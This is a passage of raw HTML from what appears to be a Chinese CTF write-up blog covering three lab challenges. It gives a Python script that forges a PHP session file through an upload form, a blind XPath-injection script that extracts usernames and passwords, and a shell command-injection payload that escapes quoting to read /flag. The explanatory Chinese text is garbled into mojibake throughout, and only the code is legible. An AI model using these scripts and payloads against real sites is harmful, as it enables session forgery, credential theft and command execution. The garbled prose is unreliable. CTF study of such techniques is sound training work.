punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/babyctf/"</span><span class="token operator">.</span><span class="token variable">$attr</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token operator">===</span><span class="token string double-quoted-string">"private"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dir_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"_"</span><span class="token operator">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Length: '</span><span class="token operator">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Disposition: attachment; filename="'</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"downloaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ–°çŸ¥è¯†ï¼šå¯ä»¥é€šè¿‡ä¸Šä¼ sessionæ–‡ä»¶ä¼ªé€ session</p><blockquote><p><strong>å¯¹äºé€šè¿‡æ–‡ä»¶å­˜å‚¨sessionçš„ï¼Œä¸åŒçš„å¼•æ“å­˜å‚¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§</strong></p><p>php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼<br>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼<br>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p></blockquote><p>çœ‹ä»£ç ï¼Œæ‹¿åˆ°flagçš„æ¡ä»¶æ˜¯ï¼Œ<code>$_SESSION[&#39;username&#39;] ===&#39;admin&#39;</code>å¹¶ä¸”<code>/var/babyctf/success.txt</code>æ–‡ä»¶å­˜åœ¨æˆ–<code>/var/babyctf/success.txt/</code>ç›®å½•å­˜åœ¨ï¼Œé¦–å…ˆå°è¯•è¯»å–sessionæ–‡ä»¶åˆ¤æ–­sessionå­˜å‚¨ç±»å‹</p><pre class="line-numbers language-none"><code class="language-none">\x08usernames:5:&quot;guest&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯´æ˜æ˜¯php_binaryæ–¹å¼å­˜å‚¨çš„ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ä¼ªé€ sessionæ–‡ä»¶äº†ï¼Œé¢˜ç›®ä¸­æ–‡ä»¶ä¸Šä¼ åä¼šè¢«é‡å‘½åä¸º<code>æ–‡ä»¶å+_+æ–‡ä»¶å†…å®¹çš„sha256è®¡ç®—åçš„å†…å®¹</code>ï¼Œç¼–å†™è„šæœ¬è¿›è¡Œä¸Šä¼ </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://650ec886-b0bc-410f-bb3c-0b8dda942bee.node4.buuoj.cn:81/index.php'</span><span class="token comment"># ç¬¬ä¸€æ­¥:ä¸Šä¼ ä¼ªé€ çš„sessionæ–‡ä»¶</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"up_file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"sess"</span><span class="token punctuation">,</span> BytesIO<span class="token punctuation">(</span><span class="token string">'\x08usernames:5:"admin";'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'direction'</span><span class="token punctuation">:</span> <span class="token string">'upload'</span><span class="token punctuation">,</span>    <span class="token string">'attr'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment"># ç¬¬äºŒæ­¥:è·å–åé¢è¯·æ±‚æ—¶çš„session_id</span>session_id <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token string">'\x08usernames:5:"admin";'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ç¬¬ä¸‰æ­¥:åœ¨/var/babyctf/ä¸‹åˆ›å»ºsuccess.txtç›®å½•</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'attr'</span><span class="token punctuation">:</span> <span class="token string">'success.txt'</span><span class="token punctuation">,</span>    <span class="token string">'direction'</span><span class="token punctuation">:</span> <span class="token string">'upload'</span><span class="token punctuation">&#125;</span>res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment"># ç¬¬å››æ­¥:é€šè¿‡ä¸Šé¢è·å–çš„session_idå‘èµ·è¯·æ±‚ï¼Œè·å–flag</span>cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> session_id<span class="token punctuation">&#125;</span>flag_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p>XXEæ˜¯ä½ å—XXE</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206111752709.png"></p><p>å°è¯•äº†ä¸€éå‘ç°ä¸æ˜¯ï¼Œçœ‹wpæ˜¯<a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">XPathæ³¨å…¥</a>ï¼Œè¿˜æœ‰ä¸€ä¸ª<a href="https://xz.aliyun.com/t/7791">ç›²æ³¨</a></p><p>XPathä¸­è¡¨ç¤ºå†…å®¹çš„æ–¹æ³•ï¼ˆç±»ä¼¼Linuxä¸­çš„æ–‡ä»¶ç»“æ„ï¼‰</p><pre class="line-numbers language-none"><code class="language-none">&#x2F; æ ¹èŠ‚ç‚¹&#x2F;* æ ¹ç»“ç‚¹ä¸‹æ‰€æœ‰å­èŠ‚ç‚¹&#x2F;&#x2F;*æ‰€æœ‰èŠ‚ç‚¹&#x2F;root&#x2F;* æ ¹ç»“ç‚¹rootä¸‹çš„æ‰€æœ‰å­èŠ‚ç‚¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€äº›å¥½ç”¨çš„XPathå‡½æ•°</p><pre class="line-numbers language-none"><code class="language-none">count è¿”å›ç»“æœçš„æ•°é‡string-length è¿”å›å­—ç¬¦ä¸²é•¿åº¦name è¿”å›èŠ‚ç‚¹åç§°substring åŒMySQLä¸­substrçš„ç”¨æ³•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜ç»™ä¸ªå¤§ä½¬è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> time session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://391bfefa-8949-4535-8129-07c86723c6b9.node4.buuoj.cn"</span>chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>head <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">#'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/xml'</span><span class="token punctuation">,</span>    <span class="token comment">#"Cookie":"UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c"</span>        <span class="token punctuation">&#125;</span> find <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;input type="hidden" id="token" value="(.*?)" />'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#çŒœæµ‹æ ¹èŠ‚ç‚¹åç§°</span>payload_1 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#çŒœæµ‹å­èŠ‚ç‚¹åç§°</span>payload_2 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#çŒœæµ‹accountsçš„èŠ‚ç‚¹</span>payload_3 <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#çŒœæµ‹userèŠ‚ç‚¹</span>payload_4 <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#è·‘ç”¨æˆ·åå’Œå¯†ç </span>payload_username <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span>payload_password <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span> <span class="token keyword">def</span> <span class="token function">get_token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#è·å–tokençš„å‡½æ•°</span>    resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>  <span class="token comment">#å¦‚æœåœ¨è¿™é‡Œç”¨headersä¼šå¾—åˆ°è¶…æ—¶çš„ç•Œé¢</span>    token <span class="token operator">=</span> find<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment">#print(token)</span>    <span class="token keyword">return</span> token <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> get_token<span class="token punctuation">(</span><span class="token punctuation">)</span>        playload <span class="token operator">=</span> payload_username<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> char<span class="token punctuation">,</span> token<span class="token punctuation">)</span>   <span class="token comment">#æ ¹æ®ä¸Šé¢çš„playloadæ¥æ”¹</span>        <span class="token comment">#print(playload)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>playload<span class="token punctuation">)</span>        <span class="token comment">#print(resp.text)</span>        <span class="token keyword">if</span> <span class="token string">"éæ³•æ“ä½œ"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            result <span class="token operator">+=</span> char            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·‘å‡ºç»“æœä¸ºadm1nå’Œmd5è§£å¯†åä¸ºgtfly123ï¼Œç™»å½•æˆåŠŸï¼Œå‘ç°ä¼ å‚ä¸­å«æœ‰æ–‡ä»¶å‚æ•°ï¼Œå°è¯•phpä¼ªåè®®è¯»å–ï¼Œè¢«æ‹¦æˆªï¼Œå¤§å°å†™ç»•è¿‡ï¼Œè¯»å–/flag</p><h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><p>æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"#flag in /flag"</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm1</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm2</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file <span class="token interpolation"><span class="token variable">$comm1</span></span> <span class="token interpolation"><span class="token variable">$comm2</span></span>"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘½ä»¤1ï¼Œ2è¿‡æ»¤å†…å®¹å¹¶ä¸ç›¸åŒï¼Œå‘½ä»¤1ä¸­è¿‡æ»¤è¾ƒå°‘ï¼Œç›´æ¥ä»è¿™è¾¹ä¸‹æ‰‹ï¼Œé¦–å…ˆåŒå¼•å·é—­åˆï¼Œåˆ†å·ç»“æŸå‘½ä»¤ï¼Œtacè¯»å–æ–‡ä»¶ï¼Œé€šé…ç¬¦åŒ¹é…æ–‡ä»¶ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">?comm1&#x3D;&quot;;tac &#x2F;f*;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 